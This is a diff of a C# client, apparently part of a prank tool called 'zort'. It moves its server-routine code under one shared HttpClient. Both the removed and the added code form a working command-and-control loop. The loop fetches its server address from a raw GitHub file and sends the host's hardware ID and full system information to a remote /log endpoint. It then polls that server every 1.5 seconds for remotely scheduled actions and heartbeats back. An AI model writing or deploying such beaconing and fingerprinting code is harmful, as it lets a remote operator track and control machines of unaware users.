@@ -30,127 +30,131 @@ namespace zort
         }
         private static async void ServerRoutine()
         {
-            List<Zort.FartSchedule> FartsAccountedFor = new List<Zort.FartSchedule>();
-            //send data to /log endpoint on startup
-            //fetch /heartbeat endpoint every 5 seconds
-
-            string HWID = SysInfoHelper.HWID();
-            SystemInfo info = SysInfoHelper.Get();
-
-            //get server url from github
-            const string GITHUB_URL = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
-            string SERVER_URL = DEFAULT_SERVER_URL;
-            using (HttpClient client = new HttpClient())
-            {
-                try
-                {
-                    var res = await client.GetAsync(GITHUB_URL);
-                    if (res.IsSuccessStatusCode)
-                    {
-                        var serverUrl = await res.Content.ReadAsStringAsync();
-                        SERVER_URL = serverUrl.Trim();
-                    }
-                    else
-                    {
-                        ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
-                    }
-                }
-                catch (Exception ex)
-                {
-                    ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL: {ex.Message}");
-                }
-            }
-
-        sendSysData:
-            var response = await SendRequestAsync(SERVER_URL, "/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) });
-            if (response.IsSuccessStatusCode)
-            {
-                ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
-            }
-            else
-            {
-                ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
-                await Task.Delay(5000);
-                goto sendSysData;
-            }
-
-        getScheduledFarts:
-            response = await SendRequestAsync(SERVER_URL, "/getFarts", new { hwid = HWID });
-            if (!response.IsSuccessStatusCode)
-            {
-                ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts. Retrying in 5 seconds...");
-                await Task.Delay(5000);
-                goto getScheduledFarts;
-            }
-
             try
             {
+                List<Zort.FartSchedule> FartsAccountedFor = new List<Zort.FartSchedule>();
+                //send data to /log endpoint on startup
+                //fetch /heartbeat endpoint every 5 seconds
 
-                var jsonResponse = await response.Content.ReadAsStringAsync();
-                List<Zort.FartSchedule> scheduledFarts = new List<Zort.FartSchedule>();
-                dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);
-                if (jObj == null || jObj.farts == null)
-                {
-                    ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
-                    goto sendHeartbeat;
-                }
+                string HWID = SysInfoHelper.HWID();
+                SystemInfo info = SysInfoHelper.Get();
 
-                for (int i = 0; i < jObj.farts.Count; i++)
+                //get server url from github
+                const string GITHUB_URL = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
+                string SERVER_URL = DEFAULT_SERVER_URL;
+                using (HttpClient client = new HttpClient())
                 {
-                    var fartSchedule = new Zort.FartSchedule
+                    try
                     {
-                        Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), ((string)jObj.farts[i].type), true),
-                        Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.farts[i].timestamp).UtcDateTime
-                    };
-                    scheduledFarts.Add(fartSchedule);
-                }
+                        var res = await client.GetAsync(GITHUB_URL);
+                        if (res.IsSuccessStatusCode)
+                        {
+                            var serverUrl = await res.Content.ReadAsStringAsync();
+                            SERVER_URL = serverUrl.Trim();
+                        }
+                        else
+                        {
+                            ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL: {ex.Message}");
+                    }
 
-                foreach (var fartSchedule in scheduledFarts)
-                {
-                    // Check if the fart is already scheduled
-                    if (FartsAccountedFor.Exists(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type)) continue;
+                sendSysData:
+                    var response = await SendRequestAsync(SERVER_URL, "/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) }, client);
+                    if (response.IsSuccessStatusCode)
+                    {
+                        ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
+                    }
                     else
                     {
-                        Zort.ScheduledFart(fartSchedule);
-                        FartsAccountedFor.Add(fartSchedule);
+                        ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
+                        await Task.Delay(5000);
+                        goto sendSysData;
                     }
+
+                getScheduledFarts:
+                    response = await SendRequestAsync(SERVER_URL, "/getFarts", new { hwid = HWID }, client);
+                    if (!response.IsSuccessStatusCode)
+                    {
+                        ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts. Retrying in 5 seconds...");
+                        await Task.Delay(5000);
+                        goto getScheduledFarts;
+                    }
+
+                    try
+                    {
+
+                        var jsonResponse = await response.Content.ReadAsStringAsync();
+                        List<Zort.FartSchedule> scheduledFarts = new List<Zort.FartSchedule>();
+                        dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);
+                        if (jObj == null || jObj.farts == null)
+                        {
+                            ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
+                            goto sendHeartbeat;
+                        }
+
+                        for (int i = 0; i < jObj.farts.Count; i++)
+                        {
+                            var fartSchedule = new Zort.FartSchedule
+                            {
+                                Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), ((string)jObj.farts[i].type), true),
+                                Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.farts[i].timestamp).UtcDateTime
+                            };
+                            scheduledFarts.Add(fartSchedule);
+                        }
+
+                        foreach (var fartSchedule in scheduledFarts)
+                        {
+                            // Check if the fart is already scheduled
+                            if (FartsAccountedFor.Exists(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type)) continue;
+                            else
+                            {
+                                Zort.ScheduledFart(fartSchedule);
+                                FartsAccountedFor.Add(fartSchedule);
+                            }
+                        }
+                    }
+                    catch (JsonException ex)
+                    {
+                        ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
+                    }
+
+                sendHeartbeat:
+                    await SendRequestAsync(SERVER_URL, "/heartbeat", new { hwid = HWID }, client);
+                    await Task.Delay(1500);
+                    goto getScheduledFarts;
                 }
             }
-            catch (JsonException ex)
+            catch (Exception ex)
             {
-                ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
+                ModuleLogger.Log(typeof(ServerCon), $"Error in server routine: {ex.Message}");
             }
-
-        sendHeartbeat:
-            await SendRequestAsync(SERVER_URL, "/heartbeat", new { hwid = HWID });
-            await Task.Delay(1500);
-            goto getScheduledFarts;
         }
 
-        static async Task<HttpResponseMessage> SendRequestAsync(string url, string endpoint, dynamic data)
+        static async Task<HttpResponseMessage> SendRequestAsync(string url, string endpoint, dynamic data, HttpClient client)
         {
-            using (HttpClient client = new HttpClient())
+            try
             {
-                try
+                // Construct the URL with query parameters from the data object
+                var requestUrl = $"http://{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
+                foreach (var property in data.GetType().GetProperties())
                 {
-                    // Construct the URL with query parameters from the data object
-                    var requestUrl = $"http://{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
-                    foreach (var property in data.GetType().GetProperties())
-                    {
-                        requestUrl += $"{property.Name}={property.GetValue(data)}&";
-                    }
-                    requestUrl = requestUrl.TrimEnd('&');
-
-                    // Send the POST request
-                    HttpResponseMessage response = await client.GetAsync(requestUrl);
-
-                    return response;
+                    requestUrl += $"{property.Name}={property.GetValue(data)}&";
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An error occurred: {ex.Message}");
-                    return null;
-                }
+                requestUrl = requestUrl.TrimEnd('&');
+
+                // Send the POST request
+                HttpResponseMessage response = await client.GetAsync(requestUrl);
+
+                return response;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+                return null;
             }
         }
     }
